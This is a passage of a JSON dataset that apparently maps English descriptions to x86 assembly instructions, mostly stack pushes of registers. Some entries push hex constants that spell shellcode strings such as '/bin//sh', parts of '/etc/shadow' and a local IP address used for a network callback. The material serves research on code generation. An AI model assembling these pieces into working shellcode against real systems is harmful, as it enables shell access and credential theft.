      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x68732f6e onto the stack",
    "rewritten_intent": "push the dword 0x68732f6e onto the stack",
    "snippet": "push dword 0x68732f6e",
    "slot_map": {
      "0x68732f6e": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x69622f2f onto the stack",
    "rewritten_intent": "push the dword 0x69622f2f onto the stack",
    "snippet": "push dword 0x69622f2f",
    "slot_map": {
      "0x69622f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x69622f3a onto the stack",
    "rewritten_intent": "push the dword 0x69622f3a onto the stack",
    "snippet": "push dword 0x69622f3a",
    "slot_map": {
      "0x69622f3a": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x6962732f onto the stack",
    "rewritten_intent": "push the dword 0x6962732f onto the stack",
    "snippet": "push dword 0x6962732f",
    "slot_map": {
      "0x6962732f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x6b2f7379 onto the stack",
    "rewritten_intent": "push the dword 0x6b2f7379 onto the stack",
    "snippet": "push dword 0x6b2f7379",
    "slot_map": {
      "0x6b2f7379": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x6b6e756a onto the stack",
    "rewritten_intent": "push the dword 0x6b6e756a onto the stack",
    "snippet": "push dword 0x6b6e756a",
    "slot_map": {
      "0x6b6e756a": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x6d6f646e onto the stack",
    "rewritten_intent": "push the dword 0x6d6f646e onto the stack",
    "snippet": "push dword 0x6d6f646e",
    "slot_map": {
      "0x6d6f646e": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x6e69622f onto the stack",
    "rewritten_intent": "push the dword 0x6e69622f onto the stack",
    "snippet": "push dword 0x6e69622f",
    "slot_map": {
      "0x6e69622f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x6e69922f onto the stack",
    "rewritten_intent": "push the dword 0x6e69922f onto the stack",
    "snippet": "push dword 0x6e69922f",
    "slot_map": {
      "0x6e69922f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x6f702f6e onto the stack",
    "rewritten_intent": "push the dword 0x6f702f6e onto the stack",
    "snippet": "push dword 0x6f702f6e",
    "slot_map": {
      "0x6f702f6e": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x6f726577 onto the stack",
    "rewritten_intent": "push the dword 0x6f726577 onto the stack",
    "snippet": "push dword 0x6f726577",
    "slot_map": {
      "0x6f726577": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x7264632f onto the stack",
    "rewritten_intent": "push the dword 0x7264632f onto the stack",
    "snippet": "push dword 0x7264632f",
    "slot_map": {
      "0x7264632f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x72657355 onto the stack",
    "rewritten_intent": "push the dword 0x72657355 onto the stack",
    "snippet": "push dword 0x72657355",
    "slot_map": {
      "0x72657355": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x732f636f onto the stack",
    "rewritten_intent": "push the dword 0x732f636f onto the stack",
    "snippet": "push dword 0x732f636f",
    "slot_map": {
      "0x732f636f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the doubleword 0x73656c62 to the stack",
    "rewritten_intent": "push the doubleword 0x73656c62 to the stack",
    "snippet": "push dword 0x73656c62",
    "slot_map": {
      "0x73656c62": "var0"
    },
    "intent_tokens": [
      "push",
      "doubleword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x73656c62 onto the stack",
    "rewritten_intent": "push the dword 0x73656c62 onto the stack",
    "snippet": "push dword 0x73656c62",
    "slot_map": {
      "0x73656c62": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x7461632f onto the stack",
    "rewritten_intent": "push the dword 0x7461632f onto the stack",
    "snippet": "push dword 0x7461632f",
    "slot_map": {
      "0x7461632f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x74652f2f onto the stack",
    "rewritten_intent": "push the dword 0x74652f2f onto the stack",
    "snippet": "push dword 0x74652f2f",
    "slot_map": {
      "0x74652f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push double word 0x74652f2f onto the stack and point the eax register to the stack register",
    "rewritten_intent": "push double word 0x74652f2f onto the stack and point the eax register to the stack register",
    "snippet": "push dword 0x74652f2f \\n mov eax, esp",
    "slot_map": {
      "0x74652f2f": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push double word 0x74652f2f onto the stack and point the ebp register to the stack register",
    "rewritten_intent": "push double word 0x74652f2f onto the stack and point the ebp register to the stack register",
    "snippet": "push dword 0x74652f2f \\n mov ebp, esp",
    "slot_map": {
      "0x74652f2f": "var0",
      "ebp": "var1"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push double word 0x74652f2f onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push double word 0x74652f2f onto the stack and point the ebx register to the stack register",
    "snippet": "push dword 0x74652f2f \\n mov ebx, esp",
    "slot_map": {
      "0x74652f2f": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push double word 0x74652f2f onto the stack and point the ecx register to the stack register",
    "rewritten_intent": "push double word 0x74652f2f onto the stack and point the ecx register to the stack register",
    "snippet": "push dword 0x74652f2f \\n mov ecx, esp",
    "slot_map": {
      "0x74652f2f": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push double word 0x74652f2f onto the stack and point the edx register to the stack register",
    "rewritten_intent": "push double word 0x74652f2f onto the stack and point the edx register to the stack register",
    "snippet": "push dword 0x74652f2f \\n mov edx, esp",
    "slot_map": {
      "0x74652f2f": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push double word 0x74652f2f onto the stack and point the esi register to the stack register",
    "rewritten_intent": "push double word 0x74652f2f onto the stack and point the esi register to the stack register",
    "snippet": "push dword 0x74652f2f \\n mov esi, esp",
    "slot_map": {
      "0x74652f2f": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the dword 0x7665642f onto the stack",
    "rewritten_intent": "push the dword 0x7665642f onto the stack",
    "snippet": "push dword 0x7665642f",
    "slot_map": {
      "0x7665642f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x776f6461 onto the stack",
    "rewritten_intent": "push the dword 0x776f6461 onto the stack",
    "snippet": "push dword 0x776f6461",
    "slot_map": {
      "0x776f6461": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the doubleword 0x8140a8c0 to the stack",
    "rewritten_intent": "push the doubleword 0x8140a8c0 to the stack",
    "snippet": "push dword 0x8140a8c0",
    "slot_map": {
      "0x8140a8c0": "var0"
    },
    "intent_tokens": [
      "push",
      "doubleword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the doubleword eax to the stack",
    "rewritten_intent": "push the doubleword eax to the stack",
    "snippet": "push dword eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "push",
      "doubleword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword eax onto the stack",
    "rewritten_intent": "push the dword eax onto the stack",
    "snippet": "push dword eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the doubleword ebx to the stack",
    "rewritten_intent": "push the doubleword ebx to the stack",
    "snippet": "push dword ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "push",
      "doubleword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push dx onto the stack",
    "rewritten_intent": "push dx onto the stack",
    "snippet": "push dx",
    "slot_map": {
      "dx": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "preserve eax on the stack",
    "rewritten_intent": "preserve eax on the stack",
    "snippet": "push eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "preserve",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push eax onto the stack",
    "rewritten_intent": "push eax onto the stack",
    "snippet": "push eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push eax to the stack",
    "rewritten_intent": "push eax to the stack",
    "snippet": "push eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push eax value to the stack",
    "rewritten_intent": "push eax value to the stack",
    "snippet": "push eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "value",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of eax onto the stack",
    "rewritten_intent": "push the contents of eax onto the stack",
    "snippet": "push eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of eax register onto the stack",
    "rewritten_intent": "push the contents of eax register onto the stack",
    "snippet": "push eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of the eax register onto the stack",
    "rewritten_intent": "push the contents of the eax register onto the stack",
    "snippet": "push eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push eax onto stack",
    "rewritten_intent": "push eax onto stack",
    "snippet": "push eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push eax on the stack",
    "rewritten_intent": "push eax on the stack",
    "snippet": "push eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value of register eax onto the stack",
    "rewritten_intent": "push the value of register eax onto the stack",
    "snippet": "push eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "register",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of the eax register onto the stack and point ebx to the stack register",
    "rewritten_intent": "push the contents of the eax register onto the stack and point ebx to the stack register",
    "snippet": "push eax \\n mov ebx, esp",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the contents of the eax register onto the stack and point ecx to the stack register",
    "rewritten_intent": "push the contents of the eax register onto the stack and point ecx to the stack register",
    "snippet": "push eax \\n mov ecx, esp",
    "slot_map": {
      "eax": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the contents of the eax register onto the stack and point edx to the stack register",
    "rewritten_intent": "push the contents of the eax register onto the stack and point edx to the stack register",
    "snippet": "push eax \\n mov edx, esp",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "save old base pointer",
    "rewritten_intent": "save old base pointer",
    "snippet": "push ebp",
    "slot_map": {},
    "intent_tokens": [
      "save",
      "old",
      "base",
      "pointer"
    ],
    "snippet_tokens": [
      "push",
      "ebp"
    ]
  },
  {
    "intent": "save the old base pointer value",
    "rewritten_intent": "save the old base pointer value",
    "snippet": "push ebp",
    "slot_map": {},
    "intent_tokens": [
      "save",
      "old",
      "base",
      "pointer",
      "value"
    ],
    "snippet_tokens": [
      "push",
      "ebp"
    ]
  },
  {
    "intent": "push the contents of the ebp register onto the stack",
    "rewritten_intent": "push the contents of the ebp register onto the stack",
    "snippet": "push ebp",
    "slot_map": {
      "ebp": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the ebp onto the stack",
    "rewritten_intent": "push the ebp onto the stack",
    "snippet": "push ebp",
    "slot_map": {
      "ebp": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push ebp onto the stack",
    "rewritten_intent": "push ebp onto the stack",
    "snippet": "push ebp",
    "slot_map": {
      "ebp": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "preserve ebx on the stack",
    "rewritten_intent": "preserve ebx on the stack",
    "snippet": "push ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "preserve",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of ebx register onto the stack",
    "rewritten_intent": "push the contents of ebx register onto the stack",
    "snippet": "push ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of the ebx register onto the stack",
    "rewritten_intent": "push the contents of the ebx register onto the stack",
    "snippet": "push ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the ebx value to the stack",
    "rewritten_intent": "push the ebx value to the stack",
    "snippet": "push ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "value",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push ebx onto the stack",
    "rewritten_intent": "push ebx onto the stack",
    "snippet": "push ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of ebx onto the stack",
    "rewritten_intent": "push the contents of ebx onto the stack",
    "snippet": "push ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push ebx on the stack",
    "rewritten_intent": "push ebx on the stack",
    "snippet": "push ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push ebx to the stack",
    "rewritten_intent": "push ebx to the stack",
    "snippet": "push ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of the ebx register onto the stack and point eax to the stack register",
    "rewritten_intent": "push the contents of the ebx register onto the stack and point eax to the stack register",
    "snippet": "push ebx \\n mov eax, esp",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the contents of the ebx register onto the stack and point ecx to the stack register",
    "rewritten_intent": "push the contents of the ebx register onto the stack and point ecx to the stack register",
    "snippet": "push ebx \\n mov ecx, esp",
    "slot_map": {
      "ebx": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the contents of the ebx register onto the stack and point edx to the stack register",
    "rewritten_intent": "push the contents of the ebx register onto the stack and point edx to the stack register",
    "snippet": "push ebx \\n mov edx, esp",
    "slot_map": {
      "ebx": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "preserve ecx on the stack",
    "rewritten_intent": "preserve ecx on the stack",
    "snippet": "push ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "preserve",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of the ecx register onto the stack",
    "rewritten_intent": "push the contents of the ecx register onto the stack",
    "snippet": "push ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value of register ecx onto the stack",
    "rewritten_intent": "push the value of register ecx onto the stack",
    "snippet": "push ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "register",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push ecx onto the stack",
    "rewritten_intent": "push ecx onto the stack",
    "snippet": "push ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of ecx register onto the stack",
    "rewritten_intent": "push the contents of ecx register onto the stack",
    "snippet": "push ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the ecx onto the stack",
    "rewritten_intent": "push the ecx onto the stack",
    "snippet": "push ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push ecx on the stack",
    "rewritten_intent": "push ecx on the stack",
    "snippet": "push ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push ecx to the stack",
    "rewritten_intent": "push ecx to the stack",
    "snippet": "push ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of the ecx register onto the stack.",
    "rewritten_intent": "push the contents of the ecx register onto the stack.",
    "snippet": "push ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "."
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the edi onto the stack",
    "rewritten_intent": "push the edi onto the stack",
    "snippet": "push edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push edi to the stack",
    "rewritten_intent": "push edi to the stack",
    "snippet": "push edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of the edi register onto the stack",
    "rewritten_intent": "push the contents of the edi register onto the stack",
    "snippet": "push edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push edi onto the stack",
    "rewritten_intent": "push edi onto the stack",
    "snippet": "push edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of edi register onto the stack",
    "rewritten_intent": "push the contents of edi register onto the stack",
    "snippet": "push edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of the edi register onto the stack and point eax to the stack register",
    "rewritten_intent": "push the contents of the edi register onto the stack and point eax to the stack register",
    "snippet": "push edi \\n mov eax, esp",
    "slot_map": {
      "edi": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the contents of the edi register onto the stack and point ebx to the stack register",
    "rewritten_intent": "push the contents of the edi register onto the stack and point ebx to the stack register",
    "snippet": "push edi \\n mov ebx, esp",
    "slot_map": {
      "edi": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the contents of the edi register onto the stack and point ecx to the stack register",
    "rewritten_intent": "push the contents of the edi register onto the stack and point ecx to the stack register",
    "snippet": "push edi \\n mov ecx, esp",
    "slot_map": {
      "edi": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the contents of the edi register onto the stack and point edx to the stack register",
    "rewritten_intent": "push the contents of the edi register onto the stack and point edx to the stack register",
    "snippet": "push edi \\n mov edx, esp",
    "slot_map": {
      "edi": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "preserve edx on the stack",
    "rewritten_intent": "preserve edx on the stack",
    "snippet": "push edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "preserve",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push edx to the stack",
    "rewritten_intent": "push edx to the stack",
    "snippet": "push edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of edx register onto the stack",
    "rewritten_intent": "push the contents of edx register onto the stack",
    "snippet": "push edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of the edx register onto the stack",
    "rewritten_intent": "push the contents of the edx register onto the stack",
    "snippet": "push edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value of register edx onto the stack",
    "rewritten_intent": "push the value of register edx onto the stack",
    "snippet": "push edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "register",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push edx onto the stack",
    "rewritten_intent": "push edx onto the stack",
    "snippet": "push edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
